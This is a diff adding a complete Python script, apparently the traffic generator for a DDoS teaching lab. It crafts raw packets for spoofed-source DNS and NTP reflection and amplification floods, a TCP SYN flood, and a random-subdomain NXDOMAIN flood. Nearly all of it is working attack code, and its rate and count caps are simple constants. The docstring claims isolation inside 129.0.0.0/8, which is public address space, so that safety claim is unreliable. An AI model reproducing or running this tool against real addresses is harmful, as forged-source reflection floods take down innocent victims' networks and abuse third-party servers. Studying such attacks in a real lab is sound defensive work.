@@ -1,0 +1,356 @@
+#!/usr/bin/env python3
+"""flood - the bounded flood generator the ddos lab's three stages are run with.
+
+Four subcommands, one per flood the lab measures:
+
+  reflect-dns   a spoofed DNS query at a reflector, so the reply lands on
+                somebody else. The query carries an EDNS0 OPT record
+                advertising a 4096-byte buffer, because without it the reply
+                caps at 512 bytes and the amplification halves.
+  reflect-ntp   the twelve-byte mode-6 control query at an NTP server, spoofed
+                the same way. Eleven bytes draws nothing and thirteen draws a
+                twelve-byte error stub; twelve is the one that answers.
+  syn           a TCP SYN from this machine's own address. No forgery: the
+                point of Stage 2 is that every packet is genuine.
+  nxdomain      a query for a name that does not exist under a zone, with a
+                fresh random label every time, sent from an ordinary socket so
+                the answer comes back here. The DO bit is set, because a signed
+                denial is what makes the answer expensive.
+
+NOTHING HAS A DEFAULT. Every run names the reflector, the forged source, the
+target, the rate and the count, which is the difference between running a tool
+and understanding what it sends.
+
+--pps and --count are both mandatory and both bounded. Unpaced, the plain-socket
+UDP loop here reaches over 100000 packets a second; the count is what makes a
+run end on its own rather than needing to be killed, and it is the whole of the
+laptop-safety argument. A run prints the packet size it is sending and the rate
+it actually achieved, which is not always the rate that was asked for.
+
+Safety: this sends traffic to exactly the addresses named on the command line.
+Every address in this lab is inside 129.0.0.0/8 on an isolated bridge with no
+route off the host.
+"""
+
+import argparse
+import os
+import random
+import signal
+import socket
+import string
+import struct
+import sys
+import time
+
+IPPROTO_RAW = 255
+PROTO_UDP = 17
+PROTO_TCP = 6
+
+MAX_COUNT = 200000
+MAX_PPS = 20000
+
+_stop = False
+
+
+def _on_signal(signum, frame):
+    global _stop
+    _stop = True
+
+
+def checksum(data: bytes) -> int:
+    """The one's-complement sum RFC 791 and RFC 793 both use."""
+    if len(data) % 2:
+        data += b"\x00"
+    total = 0
+    for i in range(0, len(data), 2):
+        total += (data[i] << 8) + data[i + 1]
+    while total >> 16:
+        total = (total & 0xFFFF) + (total >> 16)
+    return (~total) & 0xFFFF
+
+
+def ip_header(src: str, dst: str, proto: int, payload_len: int) -> bytes:
+    """A 20-byte IPv4 header.
+
+    With IPPROTO_RAW the kernel always fills in the total length and the header
+    checksum, and fills in the identification when it is zero, so those three
+    are left at zero here. The source address is NOT filled in when it is set,
+    which is what makes a forged source a forged source.
+    """
+    return struct.pack(
+        "!BBHHHBBH4s4s",
+        0x45,                      # version 4, header length 5 words
+        0,                         # DSCP / ECN
+        20 + payload_len,          # total length (the kernel rewrites it)
+        0,                         # identification (the kernel fills it in)
+        0,                         # flags and fragment offset
+        64,                        # TTL
+        proto,
+        0,                         # header checksum (the kernel fills it in)
+        socket.inet_aton(src),
+        socket.inet_aton(dst),
+    )
+
+
+def udp_header(sport: int, dport: int, payload_len: int) -> bytes:
+    """An 8-byte UDP header with the checksum left at zero.
+
+    A zero checksum means "not computed" for IPv4 UDP and every receiver in this
+    lab accepts it. It is the one field a raw sender may legitimately skip.
+    """
+    return struct.pack("!HHHH", sport, dport, 8 + payload_len, 0)
+
+
+def tcp_syn(src: str, dst: str, sport: int, dport: int, seq: int) -> bytes:
+    """A 20-byte TCP header with SYN set. The checksum is mandatory here: a TCP
+    receiver drops a segment whose checksum does not cover the real addresses,
+    so the pseudo-header has to be built from the source this packet claims."""
+    offset_flags = (5 << 12) | 0x002          # data offset 5 words, SYN
+    header = struct.pack(
+        "!HHIIHHHH", sport, dport, seq, 0, offset_flags, 64240, 0, 0
+    )
+    pseudo = struct.pack(
+        "!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst), 0, PROTO_TCP, len(header)
+    )
+    csum = checksum(pseudo + header)
+    return header[:16] + struct.pack("!H", csum) + header[18:]
+
+
+def dns_name(name: str) -> bytes:
+    out = b""
+    for label in name.rstrip(".").split("."):
+        out += bytes([len(label)]) + label.encode()
+    return out + b"\x00"
+
+
+def dns_query(qname: str, qtype: int, bufsize: int, do_bit: bool, cookie: bool) -> bytes:
+    """A DNS query message with an EDNS0 OPT record.
+
+    bufsize is advertised in the OPT record's CLASS field, which is what lets a
+    reply exceed 512 bytes. The DO bit lives in the top bit of the OPT record's
+    TTL field; a signed denial of existence only comes back when it is set.
+    A client cookie is an 8-byte option in the OPT record's rdata, which is what
+    dig sends by default, so a query from here is the size of a query from dig.
+    """
+    header = struct.pack(
+        "!HHHHHH", random.getrandbits(16), 0x0100, 1, 0, 0, 1
+    )
+    question = dns_name(qname) + struct.pack("!HH", qtype, 1)
+    if cookie:
+        rdata = struct.pack("!HH", 10, 8) + os.urandom(8)   # option 10 = COOKIE
+    else:
+        rdata = b""
+    ttl = 0x00008000 if do_bit else 0
+    opt = b"\x00" + struct.pack("!HHIH", 41, bufsize, ttl, len(rdata)) + rdata
+    return header + question + opt
+
+
+def random_label(n: int = 16) -> str:
+    alphabet = string.ascii_lowercase + string.digits
+    return "".join(random.choice(alphabet) for _ in range(n))
+
+
+def local_address_toward(dst: str) -> str:
+    """This machine's own address on the path to dst, without sending anything.
+    A connected UDP socket picks the route and names the source the kernel would
+    have used, which is the address the TCP pseudo-header has to carry."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((dst, 9))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+
+def paced_loop(count: int, pps: float, send_one, wire_bytes: int, label: str) -> int:
+    """Send `count` packets at `pps`, checking the stop flag between every one.
+
+    The pace is kept against a deadline rather than by sleeping the interval, so
+    the time a send takes comes out of the next wait instead of accumulating
+    into a rate that drifts below the one that was asked for.
+    """
+    interval = 1.0 / pps
+    started = time.monotonic()
+    deadline = started
+    sent = 0
+    for _ in range(count):
+        if _stop:
+            break
+        try:
+            send_one()
+            sent += 1
+        except OSError as exc:
+            print("send failed: %s" % exc, file=sys.stderr)
+            break
+        deadline += interval
+        remaining = deadline - time.monotonic()
+        if remaining > 0:
+            time.sleep(remaining)
+    elapsed = time.monotonic() - started
+    rate = sent / elapsed if elapsed > 0 else 0.0
+    print(
+        "%s: sent %d of %d packets in %.1fs (%.1f pps offered, %.1f pps achieved), "
+        "%d bytes on the wire each, %.1f kbit/s out"
+        % (label, sent, count, elapsed, pps, rate, wire_bytes, rate * wire_bytes * 8 / 1000.0)
+    )
+    return sent
+
+
+def raw_socket() -> socket.socket:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_RAW)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
+    return s
+
+
+# ---------------------------------------------------------------------------
+
+
+def cmd_reflect_dns(args) -> int:
+    payload = dns_query(args.qname, 16, 4096, do_bit=False, cookie=True)   # 16 = TXT
+    wire = 20 + 8 + len(payload)
+    s = raw_socket()
+    dst = args.reflector
+
+    def send_one():
+        pkt = dns_query(args.qname, 16, 4096, do_bit=False, cookie=True)
+        sport = random.randint(1024, 65535)
+        datagram = ip_header(args.spoof, dst, PROTO_UDP, 8 + len(pkt)) \
+            + udp_header(sport, 53, len(pkt)) + pkt
+        s.sendto(datagram, (dst, 0))
+
+    print("reflect-dns: %s -> %s:53 TXT %s, source forged as %s, EDNS buffer 4096"
+          % (local_address_toward(dst), dst, args.qname, args.spoof))
+    paced_loop(args.count, args.pps, send_one, wire, "reflect-dns")
+    return 0
+
+
+def cmd_reflect_ntp(args) -> int:
+    # Mode 6 (control), opcode 2 (read variables), twelve bytes exactly: two
+    # bytes of header and ten of zeroed control fields.
+    payload = b"\x16\x02" + b"\x00" * 10
+    wire = 20 + 8 + len(payload)
+    s = raw_socket()
+    dst = args.reflector
+
+    def send_one():
+        sport = random.randint(1024, 65535)
+        datagram = ip_header(args.spoof, dst, PROTO_UDP, 8 + len(payload)) \
+            + udp_header(sport, 123, len(payload)) + payload
+        s.sendto(datagram, (dst, 0))
+
+    print("reflect-ntp: %s -> %s:123 mode-6 readvar (%d byte payload), source forged as %s"
+          % (local_address_toward(dst), dst, len(payload), args.spoof))
+    paced_loop(args.count, args.pps, send_one, wire, "reflect-ntp")
+    return 0
+
+
+def cmd_syn(args) -> int:
+    src = local_address_toward(args.target)
+    wire = 20 + 20
+    s = raw_socket()
+
+    def send_one():
+        sport = random.randint(1024, 65535)
+        seq = random.getrandbits(32)
+        segment = tcp_syn(src, args.target, sport, args.port, seq)
+        datagram = ip_header(src, args.target, PROTO_TCP, len(segment)) + segment
+        s.sendto(datagram, (args.target, 0))
+
+    print("syn: %s -> %s:%d, genuine source, no forgery" % (src, args.target, args.port))
+    paced_loop(args.count, args.pps, send_one, wire, "syn")
+    return 0
+
+
+def cmd_nxdomain(args) -> int:
+    # An ordinary socket, not a raw one: the source is this machine and the
+    # answer is meant to come back here, across the victim's uplink.
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 16)
+    zone = args.zone.rstrip(".")
+    sample = dns_query("%s.%s" % (random_label(), zone), 16, 4096, do_bit=True, cookie=False)
+    wire = 20 + 8 + len(sample)
+    dst = (args.server, 53)
+
+    def send_one():
+        qname = "%s.%s" % (random_label(), zone)
+        s.sendto(dns_query(qname, 16, 4096, do_bit=True, cookie=False), dst)
+
+    print("nxdomain: %s -> %s:53 TXT <random>.%s, DO bit set, one fresh name per query"
+          % (local_address_toward(args.server), args.server, zone))
+    paced_loop(args.count, args.pps, send_one, wire, "nxdomain")
+    return 0
+
+
+# ---------------------------------------------------------------------------
+
+
+def positive_int(text: str) -> int:
+    value = int(text)
+    if value < 1:
+        raise argparse.ArgumentTypeError("must be at least 1")
+    return value
+
+
+def rate(text: str) -> float:
+    value = float(text)
+    if value < 1:
+        raise argparse.ArgumentTypeError(
+            "--pps must be at least 1: an unpaced loop here reaches over 100000 "
+            "packets a second, which is not something to run on a laptop")
+    if value > MAX_PPS:
+        raise argparse.ArgumentTypeError("--pps is capped at %d in this lab" % MAX_PPS)
+    return value
+
+
+def count(text: str) -> int:
+    value = positive_int(text)
+    if value > MAX_COUNT:
+        raise argparse.ArgumentTypeError("--count is capped at %d in this lab" % MAX_COUNT)
+    return value
+
+
+def main(argv) -> int:
+    parser = argparse.ArgumentParser(
+        prog="flood",
+        description="Bounded flood generator. Every parameter is named on every run.")
+    sub = parser.add_subparsers(dest="mode", required=True)
+
+    def add_rate(p):
+        p.add_argument("--pps", type=rate, required=True,
+                       help="packets a second (mandatory, no default)")
+        p.add_argument("--count", type=count, required=True,
+                       help="how many packets to send before exiting (mandatory)")
+
+    p = sub.add_parser("reflect-dns", help="spoofed DNS query at a reflector")
+    p.add_argument("--reflector", required=True)
+    p.add_argument("--spoof", required=True, help="the source address to forge")
+    p.add_argument("--qname", required=True, help="the name to ask for")
+    add_rate(p)
+    p.set_defaults(func=cmd_reflect_dns)
+
+    p = sub.add_parser("reflect-ntp", help="spoofed mode-6 control query at an NTP server")
+    p.add_argument("--reflector", required=True)
+    p.add_argument("--spoof", required=True, help="the source address to forge")
+    add_rate(p)
+    p.set_defaults(func=cmd_reflect_ntp)
+
+    p = sub.add_parser("syn", help="TCP SYN flood from this machine's own address")
+    p.add_argument("--target", required=True)
+    p.add_argument("--port", type=positive_int, required=True)
+    add_rate(p)
+    p.set_defaults(func=cmd_syn)
+
+    p = sub.add_parser("nxdomain", help="one fresh nonexistent name per query")
+    p.add_argument("--server", required=True)
+    p.add_argument("--zone", required=True)
+    add_rate(p)
+    p.set_defaults(func=cmd_nxdomain)
+
+    args = parser.parse_args(argv)
+    signal.signal(signal.SIGTERM, _on_signal)
+    signal.signal(signal.SIGINT, _on_signal)
+    return args.func(args)
+
+
+if __name__ == "__main__":
+    sys.exit(main(sys.argv[1:]))
